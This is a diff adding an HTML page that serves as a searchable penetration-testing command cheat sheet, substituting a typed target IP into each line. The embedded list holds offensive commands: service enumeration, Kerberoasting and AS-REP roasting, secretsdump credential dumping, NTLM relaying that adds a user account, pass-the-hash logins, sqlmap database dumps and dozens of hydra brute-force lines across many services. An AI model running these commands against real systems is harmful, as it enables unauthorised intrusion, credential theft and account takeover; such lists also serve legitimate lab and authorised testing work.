@@ -1,0 +1,324 @@
+<html data-bs-theme="dark">
+<script>
+let cmds = `
+enum4linux IP
+enum4linux -a [-u "<username>" -p "<passwd>"] IP
+enum4linux-ng -A [-u "<username>" -p "<passwd>"] IP
+nmap --script "safe or smb-enum-*" -p 445 IP
+rpcclient -U "" -N IP #No creds
+rpcclient -U "" -N IP -c "enumdomusers;enumdomgroups;enumdomains"
+rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
+rpcclient -U "username%passwd" IP #With creds
+impacket-samrdump -port 139 [[domain/]username[:password]@] IP
+impacket-samrdump -port 445 [[domain/]username[:password]@] IP
+impacket-rpcdump -port 135 [[domain/]username[:password]@] IP
+impacket-rpcdump -port 139 [[domain/]username[:password]@] IP
+impacket-rpcdump -port 445 [[domain/]username[:password]@] IP
+crackmapexec smb IP --users [-u <username> -p <password>]
+crackmapexec smb IP --groups [-u <username> -p <password>]
+crackmapexec smb IP --groups --loggedon-users [-u <username> -p <password>]
+ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h IP | grep -i samaccountname: | cut -f 2 -d " "
+lookupsid.py -no-pass hostname.loca
+msfconsole -x "use auxiliary/scanner/smb/smb_lookupsid;"
+msfconsole -x "use scanner/smb/smb_login"
+
+
+nmap IP --script dns-srv-enum --script-args "dns-srv-enum.domain='domain.com'"
+
+
+nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" IP
+
+ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt:w1 -X POST -d "log=w1&pwd=notmypass" -H "Content-Type: application/x-www-form-urlencoded" -u http://IP/wp-login.php -r -mr "incorrect"
+ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -d "username=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://IP/reset.php -fr "User doesn"
+ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt:W1,/usr/share/wordlists/rockyou.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://IP/login.php -fc 200
+
+
+sudo impacket-ntlmrelayx -t IP -c "net user bob RandomPassword1234$ /add" -smb2support
+hydra -p "" -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u IP http-post-form "/reset.php:username=^USER^^PASS^:F=User doesn't exist" -I -t 6
+
+
+
+
+nmap IP
+nmap IP -Pn
+nmap IP -sV -Pn
+ping -c 1 IP
+nmap IP --script-help 
+
+nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>',userdb=<Big_Userlist> IP
+impacket-GetUserSPNs -request -dc-ip IP <DOMAIN>/svc_tgs
+
+
+msfconsole -x 'use auxiliary/scanner/dcerpc/endpoint_mapper;'
+msfconsole -x 'use auxiliary/scanner/dcerpc/hidden;'
+msfconsole -x 'use auxiliary/scanner/dcerpc/management;'
+msfconsole -x 'use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor;'
+
+firefox http://IP/
+burpsuite
+wget -r http://IP/
+dirb http://IP/
+dirb http://IP/ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+curl http://IP/
+gobuster dir -u IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+gobuster dir -u IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
+gobuster vhost -u DOMAIN.local -w /usr/share/wordlists/seclists/oiscovery/web-content/combined_words .txt -length 347 —append-domain
+
+
+smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/Names/names.txt -t IP
+nc -vn IP 25
+dig +short mx <DOMAIN>
+nmap -p 25 --script smtp-enum-users IP
+smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t IP
+msfconsole -x 'use auxiliary/scanner/smtp/smtp_enum'
+
+dig version.bind CHAOS TXT @IP
+nmap IP --script dns-nsid
+
+nslookup IP IP
+nslookup
+dig ANY @IP <DOMAIN>
+dig axfr @IP
+dig axfr @IP <DOMAIN>
+fierce --domain <DOMAIN> --dns-servers IP
+fierce --domain <DOMAIN>
+dnsrecon -d <DOMAIN> -t axfr
+dnsrecon -r 127.0.0.0/24 -n IP
+dnsrecon -d <DOMAIN> -a -n IP
+dnsrecon -D  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -d <DOMAIN-NAME> -n <I.P-DNS>
+
+msfconsole -x 'use auxiliary/gather/enum_dns'
+
+ntpdc -c listpeers
+ntpq -c associations IP
+nmap -sU -sV --script 'ntp' and (discovery or vuln) and not (dos or brute)' -p 123 IP
+
+nmap -n -sV --script 'ldap* and not brute' IP
+
+nmap --script ftp-anon -p 21 IP
+ftp anonymous@IP
+
+snmpenum IP public windows.txt
+onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt IP
+sudo nmap IP -p 161 -sU --script 'snmp* and not snmp-brute'
+snmpwalk -v 1 -c public IP
+
+sudo nmap IP -sV --script smb-enum*
+sudo nmap IP -sV --script nbstat
+nmblookup -A IP
+nbtscan IP
+smbmap -H IP -u user -p pass
+smbclient -L IP
+smbclient \\\\\\\\IP\\\\SHARE\\\\ -U 
+
+
+xfreerdp /v:IP /u:J.Jones /p:AlohaHawaii /dynamic-resolution
+xfreerdp /v:IP /d:PACKER-WIN10 /u:Guest /p:AlohaHawaii /dynamic-resolution
+xfreerdp /v:IP /u:DOMAIN\\\\bob -dynamic-resolution /drive:tools,$(pwd)
+responder -I eth0
+
+hashcat hashes
+john hashes
+
+sqlmap http://IP/id=1 --dump
+sqlmap http://URL/id=1 --dump
+sqlmap http://URL/id=1 --dbs
+sqlmap http://URL/id=1 -D database --tables
+sqlmap http://URL/id=1 -D dbname -T tablename --dump
+mysql -u USER -h IP -p
+mysql -h IP --user=USER --password=PASS
+wpscan --url http://IP/ -e u --no-update
+
+ffuf -u http://IP/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -recursion
+
+
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP smb
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP ftp
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP ssh
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP telnet
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP mssql
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP mysql
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP mysql5
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP postgres
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP pop3
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP oracle
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP nntp
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP ldap2
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP ldap3
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP ftps
+
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP smtp
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP smtp-enum
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP rdp
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP sip
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP sshkey
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP adam
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP afp
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP asterisk
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP cisco
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP cisco‐enable
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP cvs
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP firebird
+
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP http[s]‐{head|get|post}
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP http[s]‐{get|post}‐form
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP http‐proxy
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP http‐proxy‐urlenum
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP icq
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP imap[s]
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP irc
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP ldap2[s]
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP ldap3[‐{cram|digest}md5][s]
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP mssql
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP mysql(v4)
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP mysql5
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP ncp
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP nntp
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP oracle
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP oracle‐listener
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP oracle‐sid
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP pcanywhere
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP pcnfs
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP pop3[s]
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP postgres
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP rdp
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP radmin2
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP redisrexec
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP rlogin
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP rpcap
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP rsh
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP rtsp
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP s7‐300
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP sapr3
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP sip
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP smtp[s]
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP smtp‐enum
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP snmp
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP socks5
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP ssh
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP sshkey
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP svn
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP teamspeak
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP telnet[s]
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP vmauthd
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP vnc
+hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt IP xmpp
+
+kerbrute userenum --dc IP -d DOMAIN.local usernames -o validusers.txt
+impacket-GetNPUsers DOMAIN.local/ -users
+impacket-GetNPUsers DOMAIN.local/ -users names -no-pass -dc-ip IP
+hashcat -m 18200 -a 0 hash wordlist #AS-REP ROASTING
+impacket-secretsdump -jusr-dc -no-pass DC01\$@IP
+impacket-secretsdump DOMAIN.local/bob@IP
+evil-winrm -u Administrator -H hash -I IP
+impacket-GetUserSPNs DOMAIN.local/Userl:MyPass1 -dc-ip IP -request #KERBEROAST
+impacket-ntlmrelayx -t IP -smb2support
+
+
+
+searchsploit 
+msfconsole
+msfconsole -x 'setg RHOST=IP; setg RHOSTS=IP'
+
+
+
+
+
+
+
+
+`;
+
+</script>
+
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+	<body>
+
+	<div class="container" data-bs-theme="dark">
+	
+		<div class="input-group mb-3">
+			<span class="input-group-text" id="basic-addon1">IP</span>
+			<input id=IP type="text" class="form-control" placeholder="IP address" aria-label="IP address" aria-describedby="basic-addon1">
+		</div>
+		
+		<div class="input-group mb-3">
+			<span class="input-group-text" id="basic-addon1">SEARCH</span>
+			<input id=SEARCH type="text" class="form-control" placeholder="search term" aria-label="Search term" aria-describedby="basic-addon1">
+		</div>
+
+
+    <div class="col text-center">
+
+  		
+  		  <div id=OUTPUT />
+  	</div>
+
+
+	</div>
+	</body>
+
+
+</html>
+
+<script>
+
+	function selector(num){
+
+		console.log("selected", num);
+		p = document.getElementById(num);
+
+		const selection = window.getSelection();
+		selection.removeAllRanges();
+
+		const range = document.createRange();
+		range.selectNodeContents(p);
+		selection.addRange(range);
+
+	}
+
+	function update(e){
+
+		if(e.key != "Enter"){
+			return;
+		}
+		search = document.getElementById("SEARCH").value;
+		searches = search.split(" ");
+		value = document.getElementById("IP").value;
+		output = document.getElementById("OUTPUT");
+		lines = cmds.split("\n");
+		output.innerHTML = "";
+		console.log(search);
+		num = 0;
+		for(i = 0; i < lines.length; i++){
+			addLine = 1;
+			if(lines[i].length < 1){
+				continue;
+			}
+			for(j = 0; j < searches.length; j++){
+				if(!lines[i].includes(searches[j])){
+					addLine = 0;
+				}
+			}
+
+			if(addLine){
+				v = lines[i].replace("IP", value);
+				output.innerHTML += '<div class="row">'
+				output.innerHTML += '<button class="btn btn-dark py-3" id=NUMBER onclick="selector(NUMBER);">VALUE</button>'.replace("VALUE", v).replaceAll("NUMBER", num);
+				num++;
+			}
+		}
+			
+
+	}
+
+
+	UI = document.getElementById("IP");
+	UI.addEventListener("keypress", update);
+
+	srch = document.getElementById("SEARCH");
+	srch.addEventListener("keypress", update);
+
+
+</script>
+
